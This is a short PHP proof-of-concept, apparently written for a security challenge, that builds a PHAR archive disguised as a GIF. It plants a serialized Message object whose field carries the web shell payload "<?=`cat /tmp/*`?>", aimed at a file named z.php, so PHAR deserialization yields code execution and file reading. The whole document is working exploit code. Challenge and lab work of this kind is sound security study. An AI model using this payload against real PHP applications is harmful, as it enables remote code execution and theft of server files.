<?php

// PoC for Challenge
// William Moody
// 14.04.2021

$phar = new Phar("poc.phar");

$phar->startBuffering();

$phar->addFromString('0','');
$phar->setStub("GIF8__HALT_COMPILER();");

class Message {}
$payload = new Message;
$payload->to = "<?=`cat /tmp/*`?>"; // 23 characters
$payload->filePath = "z.php";
$phar->setMetadata($payload);

$phar->stopBuffering();